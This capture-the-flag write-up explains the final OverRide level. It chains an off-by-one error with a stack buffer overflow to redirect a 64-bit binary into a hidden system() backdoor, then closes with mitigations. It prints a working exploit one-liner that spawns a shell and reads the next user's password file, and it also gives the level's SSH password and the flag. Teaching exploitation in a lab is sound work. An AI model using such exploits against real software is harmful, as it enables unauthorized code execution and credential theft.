# 🔐 Level09 - Off-by-One to RIP Control

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Welcome to the final level! This challenge combines an off-by-one error with a buffer overflow to achieve arbitrary code execution through a hidden backdoor function.

## 📋 Binary Analysis

### 🔍 Architecture & Security

**Platform:** x86-64 (64-bit ELF)

**Protection Mechanisms:**
- ❌ No stack canary detected
- ⚠️  PIE enabled (addresses randomized but exploitable)
- ❌ No bounds checking on string operations
- 🎯 Hidden `secret_backdoor` function with `system()` call

### Decompiled Code

#### Main Function

```c
int main(void) {
    puts(
        "--------------------------------------------\n"
        "|   ~Welcome to l33t-m$n ~    v1337        |\n"
        "--------------------------------------------"
    );

    handle_msg();

    return 0;
}
```

Simple wrapper that calls the vulnerable `handle_msg()` function.

#### Handle Message Function

```c
void handle_msg() {
    struct s_data data;

    // Initialize structure on stack
    memset(data.message, 0, 140);
    memset(data.username, 0, 40);
    data.len = 140; // 0x8c in hexadecimal

    // First, set username (corrupts len via off-by-one)
    set_username(&data);
    
    // Then, set message (overflows using corrupted len)
    set_msg(&data);

    puts(">: Msg sent!");
}
```

**Structure layout on stack:**
```c
struct s_data {
    char message[140];  // Offset 0
    char username[40];  // Offset 140 (0x8c)
    int len;           // Offset 180 (0xb4) - CRITICAL VARIABLE
};
```

**Memory layout visualization:**
```
+------------------------+ <- RBP - 0xc0 (Start of structure)
|   message[140 bytes]   |  Offset: 0
+------------------------+ <- RBP - 0x8c + 140
|  username[40 bytes]    |  Offset: 140 (0x8c)
+------------------------+ <- RBP - 0x8c + 180
|   len (4 bytes)        |  Offset: 180 (0xb4) ← Target of off-by-one!
+------------------------+
|   (padding/alignment)  |
+------------------------+ <- RBP
|   Saved RBP (8 bytes)  |
+------------------------+ <- RBP + 8
|   Saved RIP (8 bytes)  |  ← Final target for control flow hijack!
+------------------------+
```

#### Set Username Function (Vulnerability #1)

```c
void set_username(struct s_data *data) {
    char input[140];
    int i;

    memset(input, 0, 140);

    puts(">: Enter your username");
    printf(">>: ");
    
    fgets(input, 128, stdin);

    // CRITICAL FLAW: Off-by-One Error (CWE-193)
    // Loop allows 41 iterations (i=0 to i=40) but buffer is only 40 bytes!
    for (i = 0; i < 41 && input[i] != '\0'; i++) {
        data->username[i] = input[i];
    }

    printf(">: Welcome, %s", data->username);
}
```

**The bug:** Loop condition is `i < 41` instead of `i < 40`, allowing one extra byte to be written past the end of the username buffer.

#### Set Message Function (Vulnerability #2)

```c
void set_msg(struct s_data *data) {
    char input[1024];

    memset(input, 0, 1024);

    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    
    fgets(input, 1024, stdin);

    // CRITICAL FLAW: Buffer Overflow (CWE-120)
    // Uses corrupted len value from off-by-one error!
    strncpy(data->message, input, (size_t)data->len);
}
```

**The bug:** `strncpy` uses `data->len` which was corrupted by the off-by-one error, allowing more data to be copied than the buffer can hold.

#### Secret Backdoor Function (Never Called!)

```c
void secret_backdoor(void) {
    char command_buffer[128];
  
    // Read command from stdin
    fgets(command_buffer, 128, stdin);
    
    // Execute it via system() - ARBITRARY COMMAND EXECUTION!
    system(command_buffer);
    
    return;
}
```

**Critical observation:** This function exists in the binary but is **never called** in normal execution. It's our perfect exploitation target—if we can redirect execution here, we get arbitrary command execution!

## 🚨 Vulnerability

### Primary: Off-by-One Error (CWE-193)

The `set_username()` function contains a classic off-by-one error:

```c
for (i = 0; i < 41 && input[i] != '\0'; i++) {
    data->username[i] = input[i];
}
```

**Analysis:**

1. **Username buffer size:** 40 bytes
2. **Loop iterations:** i = 0, 1, 2, ..., 40 (that's **41 iterations**)
3. **Valid array indices:** 0 to 39 (40 elements)
4. **Out-of-bounds write:** When i = 40, writes to `data->username[40]`

**Memory corruption:**

```
username[0]  ─┐
username[1]   │
    ...       │ 40 bytes of username buffer
username[38]  │
username[39] ─┘
username[40] ──> This is actually data->len! (off-by-one writes here)
```

**Exploitation:**
- Send 40 characters + `\xff` (byte value 255)
- The 41st byte `\xff` overwrites the **first byte** of `data->len`
- Changes `len` from 140 (0x0000008c) to 255 (0x000000ff)

### Secondary: Buffer Overflow (CWE-120)

With the corrupted `len` value, the `set_msg()` function becomes exploitable:

```c
strncpy(data->message, input, (size_t)data->len);
```

**Normal behavior:**
- `len = 140`: Copies 140 bytes into 140-byte buffer ✅ Safe

**After corruption:**
- `len = 255`: Copies 255 bytes into 140-byte buffer ❌ Overflow!

**What we can overwrite:**

1. **message[140]** - Filled with padding
2. **username[40]** - Already filled from first input
3. **len (4 bytes)** - Already corrupted to 255
4. **Padding** - Variable amount for alignment
5. **Saved RBP (8 bytes)** - Can overwrite
6. **Saved RIP (8 bytes)** - **OUR TARGET!** 🎯

**Offset calculation:**
```
Distance from message start to saved RBP: 0xc0 = 192 bytes
Saved RBP size: 8 bytes
Total offset to saved RIP: 192 + 8 = 200 bytes
```

### The Hidden Backdoor

The `secret_backdoor` function is compiled into the binary but never called. This is our exploitation target:

**What it provides:**
1. Reads a command from stdin via `fgets`
2. Executes it via `system()`
3. Perfect ROP gadget for our needs!

**Address (example):** `0x55555555488c`
- Must be found at runtime due to PIE
- Use GDB: `(gdb) p secret_backdoor`

## 🎯 The Attack

### Strategy

Our attack chains two vulnerabilities to achieve code execution:

**Phase 1: Corrupt the length variable**
- Use off-by-one error in `set_username()`
- Write 40 characters + `\xff` byte
- Changes `len` from 140 to 255

**Phase 2: Overflow to saved RIP**
- Use buffer overflow in `set_msg()`
- Write 200 bytes of padding to reach saved RIP
- Overwrite RIP with address of `secret_backdoor`

**Phase 3: Execute arbitrary command**
- When `handle_msg()` returns, execution jumps to `secret_backdoor`
- Backdoor reads our third input from stdin
- Executes it via `system()` → shell access!

### Execution Flow Diagram

```
┌────────────────────────────────────────────────────────┐
│ 1. Program starts: handle_msg() allocates structure   │
│    len = 140 (0x8c)                                    │
└─────────────────────┬──────────────────────────────────┘
                      ▼
┌────────────────────────────────────────────────────────┐
│ 2. set_username() called                               │
│    Input: "A"*40 + "\xff"                              │
│    Result: username filled, len corrupted to 255       │
└─────────────────────┬──────────────────────────────────┘
                      ▼
┌────────────────────────────────────────────────────────┐
│ 3. set_msg() called                                    │
│    Input: "B"*200 + address_of_secret_backdoor         │
│    Result: message overflows, saved RIP overwritten    │
└─────────────────────┬──────────────────────────────────┘
                      ▼
┌────────────────────────────────────────────────────────┐
│ 4. handle_msg() returns                                │
│    Instead of returning to main, jumps to backdoor!    │
└─────────────────────┬──────────────────────────────────┘
                      ▼
┌────────────────────────────────────────────────────────┐
│ 5. secret_backdoor() executes                          │
│    Reads third input: "/bin/sh"                        │
│    Calls: system("/bin/sh")                            │
└─────────────────────┬──────────────────────────────────┘
                      ▼
┌────────────────────────────────────────────────────────┐
│ 6. Shell spawned! 🎉                                   │
│    We have arbitrary command execution as user 'end'   │
└────────────────────────────────────────────────────────┘
```

### Why This Works

**Key insight:** The structure layout places the `len` variable immediately after `username`:

```
username[39] = 'A'  ← Last valid byte of username
username[40] = ???  ← This is actually len[0] (first byte of len integer)!
```

**Integer representation (little-endian):**
```
Original:  len = 140 = 0x0000008c = [0x8c, 0x00, 0x00, 0x00]
Corrupted: len = 255 = 0x000000ff = [0xff, 0x00, 0x00, 0x00]
                                      ^^^^
                                      We overwrote this byte!
```

By writing `\xff` to `username[40]`, we change the integer value of `len` from 140 to 255, enabling the subsequent buffer overflow.

## 💣 Exploit

### Step 1: Find the Secret Backdoor Address

Connect to the system and use GDB:

```bash
ssh level09@localhost -p 2222
# Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

gdb ./level09
```

**In GDB:**
```gdb
(gdb) break main
Breakpoint 1 at 0xaac

(gdb) run
Starting program: /home/users/level09/level09

Breakpoint 1, 0x0000555555554aac in main ()

(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

**Important:** Note the address `0x55555555488c` - this is what we'll use in our exploit.

### Step 2: Build the Exploit Payload

We need three inputs separated by newlines:

**Input 1 - Corrupt len variable:**
```python
"A" * 40 + "\xff"
```
- 40 'A' characters fill the username buffer
- `\xff` (byte value 255) overwrites first byte of `len`

**Input 2 - Overflow to RIP:**
```python
"B" * 200 + struct.pack("<Q", 0x55555555488c)
```
- 200 'B' characters pad to reach saved RIP (192 bytes to RBP + 8 bytes RBP)
- `struct.pack("<Q", 0x55555555488c)` encodes address as 8-byte little-endian integer
- Overwrites saved RIP with address of `secret_backdoor`

**Input 3 - Command to execute:**
```python
"/bin/sh"
```
- After execution transfers to `secret_backdoor`, it reads this line
- Executes via `system("/bin/sh")`
- Spawns a shell for us!

**Why struct.pack?**

The address must be written as **binary data** in **little-endian** byte order:

```python
Address: 0x55555555488c
Little-endian bytes: \x8c\x48\x55\x55\x55\x55\x00\x00

Without struct.pack: "0x55555555488c"  (14 ASCII characters - WRONG!)
With struct.pack:    \x8c\x48\x55...  (8 binary bytes - CORRECT!)
```

### Step 3: Execute the Complete Exploit

```bash
(python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "/bin/sh"'; cat) | ./level09
```

**Command breakdown:**

- `python -c '...'` - Execute Python code inline
- `print "A"*40 + "\xff"` - First input (corrupt len)
- `print "B"*200 + struct.pack("<Q", 0x55555555488c)` - Second input (overflow to RIP)
- `print "/bin/sh"` - Third input (command for backdoor)
- `cat` - Keep stdin open for shell interaction
- `| ./level09` - Pipe all inputs to the binary

**Why `cat` at the end?**

Without `cat`, the pipeline closes after Python finishes:
```
Python outputs → Program reads → Shell spawns → stdin closes → Shell exits
```

With `cat`, stdin stays open:
```
Python outputs → cat keeps reading → Shell spawns → We can type commands!
```

### Expected Output

```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
```

**At this point, the shell is open but waiting for input. It appears frozen!**

### Step 4: Interact with the Shell

Type commands directly:

```bash
whoami
```

**Output:**
```
end
```

### Step 5: Read the Final Flag

```bash
cat /home/users/end/.pass
```

**Output:**
```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

### One-liner Exploit with Flag Retrieval

```bash
(python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "cat /home/users/end/.pass"') | ./level09
```

This version directly executes `cat /home/users/end/.pass` instead of spawning an interactive shell.

> 💡 **Pro Tip #1:** Always search for unused functions in binaries with tools like `nm`, `objdump`, or Ghidra—they might be intentional backdoors or forgotten debug code that makes exploitation easier!

> 💡 **Pro Tip #2:** Use `struct.pack("<Q", addr)` for 64-bit addresses in Python exploits—it automatically handles little-endian byte order conversion, preventing common mistakes.

> 💡 **Pro Tip #3:** Off-by-one errors are subtle but deadly—always verify loop boundaries against actual buffer sizes. The difference between `i < 40` and `i < 41` can mean complete system compromise!

## 🔒 Security Notes

### CWE References

- **CWE-193:** Off-by-One Error
  - Severity: High
  - Description: Buffer boundary condition with incorrect comparison operator
  - Impact: Memory corruption, arbitrary code execution

- **CWE-120:** Buffer Copy Without Checking Size of Input
  - Severity: High
  - Description: Copying data without verifying buffer size
  - Impact: Buffer overflow, control flow hijacking

- **CWE-787:** Out-of-bounds Write
  - Severity: High
  - Description: Writing data past the end of a buffer
  - Impact: Memory corruption, code execution, denial of service

### Mitigations

**For this binary:**

1. **Fix the off-by-one error:**
```c
// WRONG: Allows 41 iterations
for (i = 0; i < 41 && input[i] != '\0'; i++)

// CORRECT: Allows 40 iterations
for (i = 0; i < 40 && input[i] != '\0'; i++)
```

2. **Add bounds checking in strncpy:**
```c
// Ensure we never copy more than buffer size
size_t safe_len = (data->len < 140) ? data->len : 140;
strncpy(data->message, input, safe_len);
```

3. **Remove the secret_backdoor function:**
```c
// If it's not used, don't compile it in!
// Dead code = potential backdoor
```

4. **Use safer string functions:**
```c
// Replace strncpy with strncpy_s (bounds-checked version)
strncpy_s(data->message, sizeof(data->message), input, data->len);
```

5. **Enable stack canaries:**
```bash
gcc -fstack-protector-all source.c -o level09
# Detects stack corruption before return
```

**System-wide hardening:**

- **Compile with security flags:**
  ```bash
  gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wformat -Wformat-security
  ```

- **Enable ASLR:** Full address space randomization (not just PIE)
- **Use modern languages:** Rust, Go prevent buffer overflows by design
- **Static analysis:** Tools like Coverity, CodeQL catch off-by-one errors
- **Fuzzing:** AFL, libFuzzer automatically discover boundary condition bugs
- **Code review:** Manual inspection of loop boundaries and array accesses

**Common patterns to watch for:**

```c
// Off-by-one patterns:
for (i = 0; i <= SIZE; i++)        // WRONG: SIZE+1 iterations
for (i = 0; i < SIZE+1; i++)       // WRONG: SIZE+1 iterations
for (i = 1; i <= SIZE; i++)        // WRONG: Accessing array[SIZE]

// Correct patterns:
for (i = 0; i < SIZE; i++)         // CORRECT: SIZE iterations
for (i = 0; i <= SIZE-1; i++)      // CORRECT: SIZE iterations
```

## 🎉 Victory!

![Mission Success](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

You've successfully completed all 10 levels of OverRide! You've chained an off-by-one error with a buffer overflow to achieve arbitrary code execution through a hidden backdoor function.

On to the end!
